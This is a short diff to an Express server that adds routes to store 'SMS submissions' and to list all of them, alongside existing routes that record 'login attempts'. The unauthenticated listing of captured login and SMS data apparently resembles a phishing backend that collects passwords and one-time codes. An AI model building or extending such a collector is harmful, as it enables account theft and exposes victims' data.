@@ -1,7 +1,7 @@
 import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
-import { insertLoginAttemptSchema } from "@shared/schema";
+import { insertLoginAttemptSchema, insertSmsSubmissionSchema } from "@shared/schema";
 
 export async function registerRoutes(app: Express): Promise<Server> {
   // Create login attempt
@@ -47,6 +47,27 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.json(attempt);
     } catch (error) {
       res.status(500).json({ error: "Failed to fetch login attempt" });
+    }
+  });
+
+  // Create SMS submission
+  app.post("/api/sms-submissions", async (req, res) => {
+    try {
+      const validatedData = insertSmsSubmissionSchema.parse(req.body);
+      const smsSubmission = await storage.createSmsSubmission(validatedData);
+      res.json(smsSubmission);
+    } catch (error) {
+      res.status(400).json({ error: "Invalid data" });
+    }
+  });
+
+  // Get all SMS submissions
+  app.get("/api/sms-submissions", async (req, res) => {
+    try {
+      const submissions = await storage.getSmsSubmissions();
+      res.json(submissions);
+    } catch (error) {
+      res.status(500).json({ error: "Failed to fetch SMS submissions" });
     }
   });
 
